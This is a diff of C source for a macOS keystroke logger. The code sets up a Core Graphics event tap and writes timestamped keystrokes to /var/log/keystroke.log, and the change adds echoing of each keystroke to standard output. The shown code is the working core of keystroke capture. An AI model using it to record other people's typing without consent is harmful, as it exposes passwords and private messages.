@@ -13,19 +13,19 @@ int main (int argc, const char * argv[]) {
 
   CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
   CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, myCGEventCallback, &oldFlags);
-  
+
   if (!eventTap) {
     fprintf(stderr, "failed to create event tap\nyou need to enable \"Enable access for assitive devices\" in Universal Access preference panel.");
     exit(1);
   }
-  
+
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
   CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
   CGEventTapEnable(eventTap, true);
-  
+
   logFile = fopen("/var/log/keystroke.log", "a");
   CFRunLoopRun();
-  
+
   return 0;
 }
 
@@ -34,20 +34,22 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
   if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) {
     return event;
   }
-  
+
   counter++;
   CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-  
+
   if (logFile) {
     time_t currentTime;
     time(&currentTime);
     struct tm *time_info = localtime(&currentTime);
-    
+
     char fmtTime[32];
     strftime(fmtTime, 32, "%F %T", time_info);
-    
+
     fprintf(logFile, "%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
-    
+
+    printf("%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
+
     if (counter % 100 == 0) fflush(logFile);
   }
   return event;
